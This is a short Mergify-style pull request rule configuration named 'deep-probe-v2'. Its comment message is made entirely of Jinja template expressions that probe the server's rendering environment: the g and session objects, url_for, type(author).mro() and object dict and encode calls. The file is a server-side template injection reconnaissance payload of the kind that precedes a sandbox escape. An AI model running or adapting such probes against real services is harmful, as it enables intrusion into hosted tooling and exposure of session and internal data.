pull_request_rules:
  - name: deep-probe-v2
    conditions: []
    actions:
      comment:
        message: |
          G={{ g }}
          SESSION={{ session }}
          URL_FOR={{ url_for }}
          TYPE_AUTHOR={{ type(author) }}
          TYPE_MRO={{ type(author).mro() }}
          COMMITS_JSON={{ commits | tojson }}
          COMMIT0_DICT={% if commits %}{{ commits[0].dict() }}{% endif %}
          AUTHOR_ENCODE={{ author.encode() }}
          G_TYPE={{ type(g) }}
